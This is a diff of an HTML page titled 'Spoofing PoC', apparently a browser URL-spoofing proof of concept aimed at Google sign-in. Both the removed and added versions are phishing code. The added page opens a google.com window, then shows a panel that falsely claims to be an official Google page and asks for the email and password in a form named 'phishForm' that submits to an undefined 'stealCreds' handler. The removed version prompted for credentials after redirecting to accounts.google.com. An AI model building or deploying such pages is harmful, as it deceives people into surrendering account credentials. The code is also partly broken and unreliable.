@@ -1,54 +1,105 @@
-<!DOCTYPE html>
-<html>
+<!doctype html>
+<html lang="en">
   <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width,initial-scale=1" />
-    <title>Google Account</title>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Spoofing PoC</title>
     <style>
       body {
-        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
-        padding: 40px 20px;
-        text-align: center;
+        margin: 0;
+        font-family: Arial, sans-serif;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
         background: #fff;
+        text-align: center;
+      }
+      .box {
+        max-width: 420px;
+        padding: 32px;
+      }
+      h1 {
+        color: #4285f4;
+        margin-bottom: 12px;
+      }
+      p {
+        color: #666;
+        margin-bottom: 24px;
       }
       button {
-        background: #1a73e8;
-        color: white;
+        padding: 12px 20px;
         border: none;
-        padding: 12px 24px;
+        border-radius: 8px;
+        background: #4285f4;
+        color: #fff;
         font-size: 16px;
-        border-radius: 4px;
         cursor: pointer;
+      }
+      .fake-panel {
+        display: none;
+        margin-top: 24px;
+        padding: 20px;
+        border: 1px solid #ddd;
+        border-radius: 10px;
+        background: #fafafa;
       }
     </style>
   </head>
   <body>
-    <h1>Google Account Security</h1>
-    <button onclick="exploit()">Continue to Google</button>
+    <div class="box">
+      <h2>This page is official from Google, to prove it you have to click the 'Sign in to Google' button below.</h2>
+      <button onclick="runPoC()">Sign in to Google</button>
+
+      <div
+        class="fake-panel"
+        id="panel"
+        style="
+          display: none;
+          margin-top: 24px;
+          padding: 20px;
+          border: 1px solid #ccc;
+        "
+      >
+        <h3>
+          This page is a google.com page, you can see it yourself above, please
+          fill in your username and password below.
+        </h3>
+
+        <form id="phishForm" onsubmit="stealCreds(event)">
+          <div>
+            <label>Email or Phone:</label><br />
+            <input
+              type="text"
+              id="username"
+              name="username"
+              size="40"
+              required
+            />
+          </div>
+          <div style="margin-top: 10px">
+            <label>Password:</label><br />
+            <input
+              type="password"
+              id="password"
+              name="password"
+              size="40"
+              required
+            />
+          </div>
+          <div style="margin-top: 15px">
+            <button type="submit">Sign In</button>
+          </div>
+        </form>
+
+        <div id="result" style="margin-top: 10px"></div>
+      </div>
+    </div>
 
     <script>
-      function exploit() {
-        window.location.href = "https://accounts.google.com";
-
-        setTimeout(() => {
-          const creds = prompt("Google\n\nSign in\n\nEmail and password");
-          if (creds) {
-            {
-              document.body.innerHTML = `
-          <div style="max-width:600px;margin:50px auto;padding:30px;background:#f8f9fa;border-radius:8px">
-            <h2 style="color:#ea4335">PoC</h2>
-            <div style="background:#e8f0fe;padding:20px;margin:20px 0;border-radius:4px;text-align:left">
-              <strong>Email:</strong> <span style="font-family:monospace">${creds}</span><br><br>
-              <strong>Password:</strong> <span style="font-family:monospace">${pass}</span>
-            </div>
-            <div style="background:#fff3cd;padding:15px;border-radius:4px;font-size:14px">
-            User believed they were on accounts.google.com. Blank address bar prevented URL validation.
-            </div>
-          </div>
-        `;
-            }
-          }
-        }, 500);
+      function runPoC() {
+        const w = window.open("https://www.google.com/csi", "_blank");
+        document.getElementById("panel").style.display = "block";
       }
     </script>
   </body>
